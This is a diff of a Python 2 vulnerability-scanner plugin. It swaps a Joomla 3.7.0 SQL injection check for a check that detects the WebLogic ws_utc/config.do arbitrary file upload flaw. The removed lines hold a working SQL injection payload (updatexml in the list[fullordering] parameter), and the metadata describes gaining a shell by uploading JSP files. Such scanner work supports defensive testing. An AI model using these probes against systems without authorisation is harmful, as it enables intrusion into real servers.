@@ -4,26 +4,27 @@
 import requests
 def get_plugin_info():
     plugin_info = {
-        "name": "Joomla 3.7.0 SQL注入漏洞",
-        "info": "Joomla 3.7.0 存在SQL注入漏洞",
-        "level": "高危",
-        "type": "SQL注入",
+        "name": "Weblogic 任意文件上传漏洞",
+        "info": "配置中启用 Web 服务测试页后，未授权的两个页面存在任意上传getshell漏洞，利用该漏洞可以上传任意jsp文件，进而获取服务器权限",
+        "level": "紧急",
+        "type": "RCE",
         "author": "taro",
         "url": "",
-        "keyword": "all:joomla",
+        "keyword": "all:weblogic",
         "source": 1
     }
     return plugin_info
 
 def check(host, port, timeout):
-    u = "http://%s:%d" % (host, int(port))
-    payload_url = '/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(700)),1)'
+    u = "http://%s:%d/" % (host, int(port))
+    payload_url = '/ws_utc/config.do'
     url = u + payload_url
+    data = ""
     try:
-        res = requests.get(url, timeout=timeout)
-        if 'e5841df2166dd424' in res.text:
-            info = '存在未授权访问: %s' % payload_url
-            print info
+        res = requests.post(url, data=data, timeout=timeout)
+        if 'Work Home Dir' in res.text:
+            info = 'Weblogic 任意文件上传漏洞: %s' % payload_url
+            #print info
             return info
     except Exception, e:
         pass
